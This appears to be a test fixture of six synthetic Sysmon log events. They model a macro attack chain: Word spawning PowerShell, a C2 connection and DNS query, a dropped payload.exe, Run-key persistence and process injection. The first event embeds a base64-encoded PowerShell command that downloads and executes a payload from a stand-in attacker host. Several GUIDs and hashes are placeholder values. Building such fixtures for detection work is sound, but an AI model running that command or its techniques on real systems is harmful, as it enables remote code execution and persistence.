[
  {
    "_description": "Sysmon Event ID 1: ProcessCreate — powershell.exe spawned by winword.exe (macro attack indicator)",
    "xml": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-07-09T06:30:00.123456789Z'/><EventRecordID>1001</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='8'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc01.security.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>technique_id=T1059,technique_name=Command and Scripting Interpreter</Data><Data Name='UtcTime'>2026-07-09 06:30:00.123</Data><Data Name='ProcessGuid'>{ABCD1234-5678-90AB-CDEF-123456789001}</Data><Data Name='ProcessId'>5432</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='FileVersion'>10.0.19041.1</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==</Data><Data Name='CurrentDirectory'>C:\\Users\\jdoe\\Documents\\</Data><Data Name='User'>SECURITY\\jdoe</Data><Data Name='LogonGuid'>{EFGH5678-90AB-CDEF-1234-567890ABCD02}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>SHA256=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709</Data><Data Name='ParentProcessGuid'>{MNOP9012-3456-7890-ABCD-EF1234567890}</Data><Data Name='ParentProcessId'>3210</Data><Data Name='ParentImage'>C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data><Data Name='ParentCommandLine'>\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"</Data><Data Name='ParentUser'>SECURITY\\jdoe</Data></EventData></Event>"
  },
  {
    "_description": "Sysmon Event ID 3: NetworkConnect — powershell.exe connecting to external IP on port 443 (C2 beaconing)",
    "xml": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-07-09T06:30:05.456789012Z'/><EventRecordID>1005</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='8'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc01.security.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>technique_id=T1071,technique_name=Application Layer Protocol</Data><Data Name='UtcTime'>2026-07-09 06:30:05.456</Data><Data Name='ProcessGuid'>{ABCD1234-5678-90AB-CDEF-123456789001}</Data><Data Name='ProcessId'>5432</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='User'>SECURITY\\jdoe</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.10.50</Data><Data Name='SourceHostname'>win-dc01.security.local</Data><Data Name='SourcePort'>49162</Data><Data Name='SourcePortName'></Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>185.220.101.34</Data><Data Name='DestinationHostname'>tor-exit-node.example.com</Data><Data Name='DestinationPort'>443</Data><Data Name='DestinationPortName'>https</Data></EventData></Event>"
  },
  {
    "_description": "Sysmon Event ID 22: DnsQuery — suspicious DNS query to C2 domain",
    "xml": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-07-09T06:30:10.789012345Z'/><EventRecordID>1010</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='8'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc01.security.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>technique_id=T1071.004,technique_name=DNS</Data><Data Name='UtcTime'>2026-07-09 06:30:10.789</Data><Data Name='ProcessGuid'>{ABCD1234-5678-90AB-CDEF-123456789001}</Data><Data Name='ProcessId'>5432</Data><Data Name='QueryName'>evil-c2.example.com</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>type: A; 45.33.32.156;</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='User'>SECURITY\\jdoe</Data></EventData></Event>"
  },
  {
    "_description": "Sysmon Event ID 11: FileCreate — executable dropped in Temp directory",
    "xml": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-07-09T06:30:15.012345678Z'/><EventRecordID>1015</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='8'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc01.security.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>technique_id=T1105,technique_name=Ingress Tool Transfer</Data><Data Name='UtcTime'>2026-07-09 06:30:15.012</Data><Data Name='ProcessGuid'>{ABCD1234-5678-90AB-CDEF-123456789001}</Data><Data Name='ProcessId'>5432</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='TargetFilename'>C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe</Data><Data Name='CreationUtcTime'>2026-07-09 06:30:15.012</Data><Data Name='User'>SECURITY\\jdoe</Data></EventData></Event>"
  },
  {
    "_description": "Sysmon Event ID 13: RegistryEvent (Value Set) — Run key persistence mechanism",
    "xml": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-07-09T06:30:20.345678901Z'/><EventRecordID>1020</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='8'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc01.security.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>technique_id=T1547.001,technique_name=Registry Run Keys / Startup Folder</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2026-07-09 06:30:20.345</Data><Data Name='ProcessGuid'>{ABCD1234-5678-90AB-CDEF-123456789001}</Data><Data Name='ProcessId'>5432</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='TargetObject'>HKU\\S-1-5-21-1234567890-1234567890-1234567890-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate</Data><Data Name='Details'>C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe</Data><Data Name='User'>SECURITY\\jdoe</Data></EventData></Event>"
  },
  {
    "_description": "Sysmon Event ID 8: CreateRemoteThread — process injection from powershell into svchost",
    "xml": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>8</EventID><Version>2</Version><Level>4</Level><Task>8</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-07-09T06:30:25.678901234Z'/><EventRecordID>1025</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='8'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc01.security.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>technique_id=T1055,technique_name=Process Injection</Data><Data Name='UtcTime'>2026-07-09 06:30:25.678</Data><Data Name='SourceProcessGuid'>{ABCD1234-5678-90AB-CDEF-123456789001}</Data><Data Name='SourceProcessId'>5432</Data><Data Name='SourceImage'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='TargetProcessGuid'>{ZZZZ9999-8888-7777-6666-555544443333}</Data><Data Name='TargetProcessId'>1024</Data><Data Name='TargetImage'>C:\\Windows\\System32\\svchost.exe</Data><Data Name='NewThreadId'>2048</Data><Data Name='StartAddress'>0x7FFA12345678</Data><Data Name='StartModule'>C:\\Windows\\System32\\ntdll.dll</Data><Data Name='StartFunction'>RtlUserThreadStart</Data><Data Name='User'>SECURITY\\jdoe</Data></EventData></Event>"
  }
]
